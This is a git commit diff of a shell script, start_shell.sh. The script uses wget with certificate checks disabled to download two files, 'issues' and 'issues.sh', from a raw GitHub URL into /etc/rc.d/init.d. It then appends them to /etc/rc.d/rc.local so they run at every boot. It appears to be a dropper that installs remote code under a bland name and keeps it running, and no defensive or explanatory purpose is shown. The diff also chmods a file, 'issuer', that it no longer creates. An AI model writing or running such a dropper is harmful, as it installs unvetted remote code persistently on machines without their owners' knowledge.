696b7b4e0b702502e6a1c431faf9068afa8e5446
0x594 <51328807+0x594@users.noreply.github.com>
2021-08-05 17:23:33 +0800

    Update start_shell.sh

--- start_shell.sh
+++ start_shell.sh
@@ -7,13 +7,13 @@ num1=$(ps -ef | grep issues | wc -l)
 url1="https://raw.githubusercontent.com/0x594/test/main/issues"
 url2="https://raw.githubusercontent.com/0x594/test/main/issues.sh"
 if [ ! -f "$file1" ]; then
-  wget -P "$file1" --no-check-certificate $url1 -O /etc/rc.d/init.d/issuer
-  wget -P "$file2" --no-check-certificate $url2 -O /etc/rc.d/init.d/issues.sh
-  chmod a+x /etc/rc.d/init.d/issuer
+  wget -P "$file1" --no-check-certificate "$url1" -O /etc/rc.d/init.d/issues
+  wget -P "$file2" --no-check-certificate "$url2" -O /etc/rc.d/init.d/issues.sh
 fi
 if [ `grep -c "issues" /etc/rc.d/rc.local` -eq '0' ]; then
     echo "/etc/rc.d/init.d/issues" >> /etc/rc.d/rc.local
 	echo "/etc/rc.d/init.d/issues.sh" >> /etc/rc.d/rc.local
 	chmod +x /etc/rc.d/rc.local
+	chmod a+x /etc/rc.d/init.d/issuer
+	chmod a+x /etc/rc.d/init.d/issues.sh
 fi
-
